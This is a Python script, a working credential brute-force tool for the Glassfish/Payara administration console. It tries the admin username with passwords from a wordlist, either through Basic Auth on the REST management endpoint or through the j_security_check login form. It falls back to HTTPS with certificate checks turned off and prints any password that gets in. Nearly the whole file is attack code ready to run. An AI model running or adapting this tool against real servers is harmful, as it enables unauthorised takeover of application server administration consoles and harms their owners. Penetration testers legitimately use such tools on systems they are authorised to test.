import requests
import base64
import ast
from optparse import OptionParser

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings()

"""
This is a simple Glassfish/Payara administration console bruteforce script.

By providing a password list it can bruteforce the login credentials for the administration console.

Two methods are supported.

API : The "API" method will make a "GET" request to the "auth-realm.json" page
WEB : The "WEB" method will make a "POST" request to the "j_security_check" page

By default the port to use is "4848" and the default username/password is admin/admin

Examples :

python3 bruteGF.py -t 127.0.0.1
python3 bruteGF.py -t 127.0.0.1 -p 4949 -f /usr/share/wordlists/rockyou.txt -m API
python3 bruteGF.py -t 127.0.0.1 -m JSecurityCheck

"""

def brute(targetHost, targetPort, passwordFilename, method):
    if passwordFilename == "admin":
        passwordList = ["admin"]
    else:
        with open(passwordFilename, "r") as handle:
            passwordList = [pw.strip() for pw in handle.readlines()]

    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36'}

    if method == "API":
        for pw in passwordList:
            b64_data = base64.b64encode((("admin:" + pw).encode())).decode('utf-8')
            headers['Authorization'] = 'Basic ' + b64_data
            try:
                r = requests.get("http://"+ str(targetHost) +":" + str(targetPort) + "/management/domain/configs/config/default-config/security-service/auth-realm.json", headers=headers, timeout=6)
            except requests.exceptions.RequestException as e:
                try:
                    r = requests.get("https://"+ str(targetHost) +":" + str(targetPort) + "/management/domain/configs/config/default-config/security-service/auth-realm.json", headers=headers, verify=False, timeout=6)
                except requests.exceptions.RequestException as e:
                    break
            if r.status_code == 200:
                print("Try the following password : " + str(pw))
                break
                
    elif method == "JSecurityCheck":
        for pw in passwordList:
            try:
                r = requests.post("http://" + str(targetHost) + ":" + str(targetPort) + "/j_security_check", data={"j_username":"admin", "j_password":str(pw), "loginButton":"Login"})
            except requests.exceptions.RequestException as e:
                try:
                    r = requests.post("https://" + str(targetHost) + ":" + str(targetPort) + "/j_security_check", data={"j_username":"admin", "j_password":str(pw), "loginButton":"Login"}, verify=False, allow_redirects=False)
                except requests.exceptions.RequestException as e:
                    break
            if r.status_code == 302:
                print("Try the following password : " + str(pw))
                break

if __name__ == "__main__":
    parser = OptionParser()
    parser.add_option("-f", "--pwfile", dest="passwordFilename", default="admin",
                    help="Path to password file (Default password 'admin')", metavar="PwFile")
    parser.add_option("-p", "--port", dest="targetPort", default=4848,
                    help="Administration port (Default 4848)")
    parser.add_option("-t", "--target", dest="targetHost",
                    help="Glassfish / Payara host server")
    parser.add_option("-m", "--method", dest="method", default="API",
                    help="Bruteforce method (Supported : API / JSecurityCheck)")

    (options, args) = parser.parse_args()
    if not options.targetHost:
        parser.error("No Host Provided")

    targetHost = options.targetHost
    passwordFilename = options.passwordFilename
    targetPort = options.targetPort
    method = options.method

    if method == "API":
        brute(targetHost, targetPort, passwordFilename, "API")
    elif method == "JSecurityCheck":
        brute(targetHost, targetPort, passwordFilename, "JSecurityCheck")
    else:
        parser.error("Unknown Method Provided")
